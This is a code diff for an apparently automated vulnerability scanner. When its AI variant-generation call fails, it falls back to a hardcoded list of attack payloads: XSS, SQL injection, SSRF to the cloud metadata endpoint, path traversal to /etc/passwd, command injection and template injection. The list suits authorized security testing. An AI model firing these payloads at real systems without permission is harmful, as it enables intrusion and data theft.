@@ -128,9 +128,30 @@ Given a known CVE, identify its ROOT-CAUSE PATTERN, then return 3-5 novel varian
       }),
     });
 
-    if (!aiResp.ok) throw new Error(`AI ${aiResp.status}`);
-    const aiData = await aiResp.json();
-    const args = JSON.parse(aiData.choices?.[0]?.message?.tool_calls?.[0]?.function?.arguments || "{}");
+    let args: any = { variants: [] };
+    if (!aiResp.ok) {
+      // 🔄 DEGRADED MODE — credits/quota exhausted. Fall back to deterministic
+      // mutation set so the kill-path keeps running instead of crashing.
+      await db.from("scan_logs").insert({
+        target_id: targetId, log_type: "warn",
+        message: `🪫 Variant-Gen AI ${aiResp.status} — switching to deterministic mutation set (no-AI mode)`,
+        metadata: { phase: "variant-degraded", run_id: runId, status: aiResp.status },
+      }).then(() => {}, () => {});
+      const DETERMINISTIC: Array<{ vuln_class: string; variant_payload: string; root_cause_pattern: string; variant_rationale: string }> = [
+        { vuln_class: "xss", variant_payload: `"><svg/onload=alert('CYBERSCOPE_PROVEN')>`, root_cause_pattern: "reflected-svg", variant_rationale: "Bypasses naive < filter" },
+        { vuln_class: "xss", variant_payload: `<details open ontoggle=alert('CYBERSCOPE_PROVEN')>`, root_cause_pattern: "reflected-details", variant_rationale: "HTML5 tag rarely blocked" },
+        { vuln_class: "sqli", variant_payload: `' OR '1'='1'-- -`, root_cause_pattern: "auth-bypass", variant_rationale: "Classic tautology" },
+        { vuln_class: "sqli", variant_payload: `' UNION SELECT NULL,version()-- -`, root_cause_pattern: "union-leak", variant_rationale: "Version disclosure" },
+        { vuln_class: "ssrf", variant_payload: `http://169.254.169.254/latest/meta-data/`, root_cause_pattern: "cloud-meta", variant_rationale: "AWS IMDSv1" },
+        { vuln_class: "lfi", variant_payload: `../../../../etc/passwd`, root_cause_pattern: "path-traversal", variant_rationale: "Linux passwd" },
+        { vuln_class: "cmdi", variant_payload: `;echo CYBERSCOPE_PROVEN;`, root_cause_pattern: "cmd-chain", variant_rationale: "Deterministic proof" },
+        { vuln_class: "ssti", variant_payload: `{{7*7}}__CYBERSCOPE__`, root_cause_pattern: "template-eval", variant_rationale: "Jinja/Twig" },
+      ];
+      args = { variants: DETERMINISTIC.map(v => ({ parent_cve: "GENERIC", ...v })) };
+    } else {
+      const aiData = await aiResp.json();
+      args = JSON.parse(aiData.choices?.[0]?.message?.tool_calls?.[0]?.function?.arguments || "{}");
+    }
     // Drop shell commands, prose, pseudocode, and oversized blobs.
     const isValidVariantPayload = (p: unknown): p is string => {
       if (typeof p !== "string") return false;
